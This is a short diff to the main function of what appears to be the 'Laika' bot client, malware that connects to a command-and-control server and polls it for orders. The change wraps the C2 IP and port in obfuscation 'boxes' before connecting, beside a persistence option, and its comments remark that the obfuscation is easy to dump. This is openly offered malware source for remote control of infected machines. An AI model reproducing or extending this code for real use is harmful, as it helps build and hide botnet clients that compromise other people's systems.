@@ -1,5 +1,6 @@
 #include <stdio.h>
 
+#include "lbox.h"
 #include "lconfig.h"
 #include "lerror.h"
 #include "ltask.h"
@@ -12,6 +13,10 @@
 #else
   int main() {
 #endif
+    /* these boxes are really easy to dump, they're unlocked at the very start of execution and left in memory the entire time.
+        not only that but they're only obfuscating the ip & port, both are things anyone would see from opening wireshark */
+    LAIKA_BOX_SKID_START(char*, cncIP, LAIKA_CNC_IP);
+    LAIKA_BOX_SKID_START(char*, cncPORT, LAIKA_CNC_PORT);
     struct sLaika_bot *bot;
 
 #ifdef LAIKA_PERSISTENCE
@@ -25,7 +30,7 @@
 
         LAIKA_TRY
             /* connect to test CNC */
-            laikaB_connectToCNC(bot, LAIKA_CNC_IP, LAIKA_CNC_PORT);
+            laikaB_connectToCNC(bot, cncIP, cncPORT);
 
             /* while connection is still alive, poll bot */
             while (laikaS_isAlive((&bot->peer->sock))) {
@@ -46,5 +51,6 @@
     laikaB_unmarkRunning();
 #endif
 
+    /* vm boxes are left opened */
     return 0;
 }
